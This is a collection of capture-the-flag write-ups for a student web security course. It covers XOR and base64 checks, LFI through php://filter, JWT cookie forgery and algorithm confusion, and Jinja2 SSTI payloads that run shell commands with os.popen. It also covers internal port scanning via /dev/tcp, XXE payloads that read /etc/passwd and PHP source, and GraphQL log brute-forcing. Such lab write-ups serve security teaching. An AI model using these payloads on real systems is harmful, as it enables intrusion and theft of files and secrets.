# Web Security CTF

CTF made for Epitech.

Students: Alexis AURIAC, Victor THOMAS

- [auth50](#auth50)
- [auth100](#auth100)
- [auth200](#auth200)
- [b64js](#b64js)
- [JS200](#JS200)
- [lfi1](#lfi1)
- [lfi2](#lfi2)
- [lfi3](#lfi3)
- [OBF100](#OBF100)
- [mythique1](#mythique1)
- [mythique2](#mythique2)
- [ssti1](#ssti1)
- [ssti2](#ssti2)
- [ssti3](#ssti3)
- [ssti4](#ssti4)
- [xxe1](#xxe1)
- [confessions](#confessions)

# auth50

## What it is

A website that asks for a username and a password.

"FUCK GUESSING CHALLENGES!!" is a the top of the page.

## Solution

You just need to guess the credentials.

username: ```admin```
password: ```password```
flag: ```BFS{We_f1n@llY_c@n_Tr0lL_t3am5_1Ts_0uR_TuRn}```

# auth100

## What it is

A website that asks for a username and a password.

The username must be at least 6 characters long.

We can get the source code of the page (see source.php).

We can see that the password is the sum of the numeric value of each characters in the username.

## Solution

(See genPwd.py)

```bash
$ ./genPwd.py aaaaaa
582
```

# auth200

## What it is

A website that asks for a flag.

We can access the source of the page (see source.php).

In the source we can see that it xors the input with key ```Th1s_1s_@_x0r_k3y_l0l!``` and encodes it to hex.

It compares the result to ```3c09431700451c00232d19531900026c1e2a09431f7e38075d527e1052```.

## Solution

(see solve.py)

Decode it from hex and xor it with key.

website flag: ```hard_to_crack_i_guess_lol!!!!```
challenge flag: ```BFS{1_L0v3_t0_x0r_tH1ng5_l1k3_@_p0nY!}```

# b64js

## What it is

It is a website that asks for a password.

When the password it goes through this line:
```js
window.btoa(unescape(encodeURIComponent(input)))
```

```unescape``` and ```encodeURIComponent``` sanitize the input.

```window.btoa``` transforms the input into base64.

It then compares the result to ```RXZlckhlYXJkT2ZCYXNlNjQ/```.

## Solution

Decode ```RXZlckhlYXJkT2ZCYXNlNjQ/``` from base64.

Example:
```bash
$ echo "RXZlckhlYXJkT2ZCYXNlNjQ/" | base64 -d
EverHeardOfBase64?
```
flag: ```BFS{EverHeardOfBase64?}```

# JS200

## What it is

It asks for an input, the input goes through this function:
```js
function validate() {
	var flag = "K@UC,bswslubr.wohp.dibokdmdb";
	var input = document.getElementById("flag").value
	var i = 0
	var out = ""
	do {
		out += String.fromCharCode(input.charCodeAt(i) ^ 1);
		out += String.fromCharCode(input.charCodeAt(i + 1) ^ 3);
		out += String.fromCharCode(input.charCodeAt(i + 2) ^ 3);
		out += String.fromCharCode(input.charCodeAt(i + 3) ^ 7);
		i += 4;
	} while (i < 28);
	if (out === flag) {
		alert("Congratz! Validate this challenge with the flag BFS{" + input + "}")
	} else {
		alert("Try again !")
	}
}
```

It xors the input ```1337``` (byte1 ^ 1, byte2 ^ 3, etc...).

## Solution

(see solve.js)

Since we have the key and the cipher we can xor them together to get the plain text.

flag: ```BFS{JCVD-approves-this-challenge}```

# lfi1

## What it is

It's a PHP website with links to youtube videos, the flag is in one of the comments of the videos (supposedly).

We have access to the source of index.php.

Line 61:
```php
require('config.php');
```
This file probably contains the flag.

At line 62 we have this:
```php
if (isset($_GET['lang']))
{
  require($_GET['lang']);
}
```
It directly gives user input to ```require```.

## Solution

https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/

If we just give the file name the php in it will be executed.

To prevent that we can use ```php://filter/convert.base64-encode/resource=config.php```.
```
https://filters.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php
```

This base64 string will at the top of the page:
```
PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgQkZTe1VfaDR2M19VbjAhISF9Cj8+Cg==
```

After decoding it:
```php
<?php
  // Congratz ! FLAG IS BFS{U_h4v3_Un0!!!}
?>
```

flag: ```BFS{U_h4v3_Un0!!!}```

# lfi2

## What it is

A very simple website.

It says ```Flag is in an obvious html place.```.

## Solution

Tried a few urls before trying ```https://noprotection.secu-web.blackfoot.dev/flag.html```

It shows ```Congratz, you can validate with ZOB{y34h_y0u_f0und_m3}```.

# lfi3

## What it is

Almost the same as lfi1, but we don't have access to the source code.

## Solution

The solution is the same as for lfi1, except that the input given is concatenated with '.php'

Url: 
```
https://extprotect.secu-web.blackfoot.dev/?lang=php://filter/convert.base64-encode/resource=config
```

Base64 config.php:
```
PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgWk9CezN2M25fcHIwdF9jNG43X3N0MHBfbTN9Cj8+Cg== 
```

flag: ```ZOB{3v3n_pr0t_c4n7_st0p_m3}```

# OB100

## What it is

(see index.html)

It asks for a password and checks it with obfiscated code.

At around line 9 (around column 662) we can see:
```js
if(password=== input)
```

And at column 597:
```js
var password=_0xf7f7[0]
```

At column 5:
```js
var _0xf7f7=["\x67\x67\x65\x7A", ...
```

The password is ```\x67\x67\x65\x7A``` and the input is compared directly against it.

## Solution

If we interpret the string we find the password.

```bash
$ echo "\x67\x67\x65\x7A"
ggez
```

flag: ```BCS{ggez}```

# mythique1

## What it is

It's a website that requires an admin cookie to get the flag.

We can see in the code of the page that it splits the cookie in function of '.'. It then decodes the second part of the cookie for base64 and parses as a JSON object.

The decoded cookie looks like this:
```json
{
	"exp": 1669289642,
	"data": {
		"name": "Nuage À Gauche",
		"isAdmin": false
	},
	"iat": 1669286042
}
```

## Solution

(see solve.js)

We define a target admin cookie, for example:
```json
{
	"exp": 1669289642,
	"data": {
		"name": "Hack3r",
		"isAdmin": true
	},
	"iat": 1669286042
}
```

We encode it to base64 and insert it into the second part of the cookie.

Note: the name used matters in this case, names with non-ascii characters need more steps to work, but since we can put in any name it doesn't really matters.

# mythique2

## What it is

A website with a button that requires an admin jwt cookie to give the flag.

We know the jwt cookie uses RS256 (jwt algos: https://stackoverflow.com/a/39239395/12864941).

We can download the public key (see ```serverkey.pub```).

## Solution

(https://debricked.com/blog/json-web-tokens/)
(see solve.js)

We can use an algorithm confusion attack.

We create an admin cookie with HS256, using the server's public key as a secret key.

When the server tries to verify the token was signed with its private key, it will use its public key. But since our token is HS256, it will think the secret keys match.

flag: ```BFS{!W0W_muCh_s3cURe_V3rY_jWt!}``` 

# ssti1

## What it is

A website made with flask that uses jinja2 for templating.

It takes a name in an input field and displays it.

## Solution

https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

From a string literal you can get the base class and open a file.

To get the content of ```app.py```:
```py
{{'abc'.__class__.__base__.__subclasses__()[96].__subclasses__()[0].__subclasses__()[0]('app.py').read()}}
```

We get:
```py
b'from flask import Flask, request, render_template_string, config\n\n\napp = Flask(__name__)\n\napp.config["FLAG"] = "BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}"\n\n\n@app.route("/")\ndef index():\n    name = request.args.get("username", "guest")\n    template = open("./index.html").read().format(name)\n    return render_template_string(template)\n\n\nif __name__ == "__main__":\n    app.run()\n'
```

After formatting:
```py
from flask import Flask, request, render_template_string, config

app = Flask(__name__)

app.config["FLAG"] = "BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}"

@app.route("/")
def index():
	name = request.args.get("username", "guest")
	template = open("./index.html").read().format(name)
	return render_template_string(template)

if __name__ == "__main__":
    app.run()
```

flag: ```BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}```

# ssti2

## What it is

Same as ssti1 but flag is not in app.py

## Solution

```_io._IOBase``` is not exactly in the same place:
```py
{{'abc'.__class__.__base__.__subclasses__()[106].__subclasses__()[0].__subclasses__()[0]('app.py').read()}}
```

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#rce-bypassing-as-much-as-i-possibly-can

Using the request object we can get access to the ```os``` module and do some IO.

List files in the current directory:
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

Result:
```
app.py
config.py
flag.txt
index.html
```

To open ```flag.txt```:
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

flag: ```BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}```

# ssti3

## What it is

Same as ssti2 but flag is not in app.py or in a file.

Files in the directory:
```
app.py
config.py
getFlag
index.html
```

```getFlag``` is an elf file.

## Solution

Run ```getFlag```:
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('./getFlag').read()}}
```

flag: ```BFS{Oh_My..._I_Can_RCE_PyTh0N!!}```

# ssti4

## What it is

Same as sst3.

The flag doesn't seem to be in any of the server files.

```dalek.py``` launches the web server and kills children processes every 10 secondes, preventing backdoors.

There is a ```docker-compose.yml``` file:
```yml
version: "3.3"

# FIXME: Don't forget to place this file inside .dockerignore ! we don't want anyone looking at this

services:
  ssti4:
    build: "./Challenges/SSTI/ssti4"
    restart: always
    networks:
      ssti4:

  # TODO: This is old don't forget to stop the server in the next version !
  # toto8042:
  #   build: "./Challenges/SSTI/ssti4/toto8042"
  #   restart: always
  #   port:
  #     - ":" WARNING: The port was still open, asked Sysadmin to remove it last month....
  #   networks:
  #     ssti4:'
```

It references a toto8042 service that shouldn't be up but still is.

```yml
#   port:
  #     - ":"
```
This tells us that all ports are forwarded.

ssti4 and toto8042 are on the same network (https://docs.docker.com/compose/networking/#specify-custom-networks).

We can confirm that by pinging toto8042:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ping -c 1 toto8042').read()}}
PING toto8042 (172.23.0.2): 56 data bytes
64 bytes from 172.23.0.2: icmp_seq=0 ttl=64 time=0.147 ms
--- toto8042 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.147/0.147/0.147/0.000 ms
```

## Solution

### Port discovery

(see port_discovery.js)

nmap (as well as nc, telnet and more) is not available on ssti4 so we can't use it to discover ports.

Fortunately the list of the 1000 most used ports is available [here](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/).

We can test if a port is open with this simple bash command ([source](https://stackoverflow.com/a/35338529/12864941)):
```bash
timeout 1 bash -c '</dev/tcp/toto8042/${i}' && echo -n open || echo -n closed
```

Using this method we find that ports 4242 and 8042 are open.

### Port 8042

Running curl on 8042 (using ssti) returns this:
```bash
$ curl toto8042:8042
this is not the way this time, goodluck !!
```

### Port 4242

(see solve.js)

Port 4242 is not http.

We used python3 to open a TCP socket.

To run python code we can use ```python3 -c "command"```.

The ssti command looks like this:
```py
{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\"").read()}}
```
Note: quotes get a little tricky, the python command can only single quotes, at least using our implementation.

To see stderr we add ``` 2>&1 | cat``` at the end of the command (redirects stderr to stdout).
```py
{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\" 2>&1 | cat").read()}}
```

We can prevent modifications of the output by jinja by using the "safe" filter ([source](https://stackoverflow.com/a/12341532/12864941)), it is particularly useful when reading python errors.
```py
{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\" 2>&1 | cat").read()|safe}}
```

We can then open a socket to ```toto8042:4242``` and read it ([source](https://wiki.python.org/moin/TcpCommunication)):
```py
import socket

TCP_IP = 'toto8042'
TCP_PORT = 4242
BUFFER_SIZE = 128

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
s.close()

print(data.decode('utf-8'))
```

flag: ```BFS{doCKErcEpt1On8042}```

# xxe1

## What it is

A website with an input field.

The message is sent to the server in the form of an xml (base64 + URI encoded).

The decoded xml looks like this:
```xml
<?xml version="1.0"?>
<document>
	<message>abc</message>
</document>
```

It returns a message like this:
```
Thanks for your message: 'abc'
```

In the source of the page we can see:
```html
<!-- // include_once('flag.php'); -->
```

## Solution

(see solve.js)

https://portswigger.net/web-security/xxe
https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file

We can use some xml features to retrieve external entities from the server.

For example:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<document>
	<message>&xxe;</message>
</document>
```

```file://``` will not work for ```flag.php``` because it will be interpreted by php, we can use ```php://filter/convert.base64-encode/resource=``` instead (see ssti1).

The final payload looks like this:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php"> ]>
<document>
	<message>&xxe;</message>
</document>
```

flag.php:
```php
<?php

$flag = "BFS{XX3_FtW_SRL5Y_F0UND_TH3SE_D4YS_1T_W4S_H4RD_T0_D3V}";
```

flag: ```BFS{XX3_FtW_SRL5Y_F0UND_TH3SE_D4YS_1T_W4S_H4RD_T0_D3V}```

# Confessions

## What it is

It's a website where you can enter a message, the message will be hashed with sha256 and sent to a server.

The message is hased and sent every time the input changes (with every character).

This request gives us the types on the graphql API (can't find source):
```
https://confessions.secu-web.blackfoot.dev/graphql?query={__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

One interesting type is ```RequestLog``` which has the description ```"Show the resolver access log. TODO: remove before production release"```.

We can get all access logs with:
```bash
curl 'https://confessions.secu-web.blackfoot.dev/graphql?query=\{requestsLog\{name,args,timestamp\}\}'
```

## Solution

(see index.js)

If, for example, someone types "abc" on the website it will make 3 hashes:
1: "a"
2: "ab"
3: "abc"

We can get the first log, wich must be 1 character long, and brute force it.

Once we have the first character we can get the second log and brute force the second character and so on.


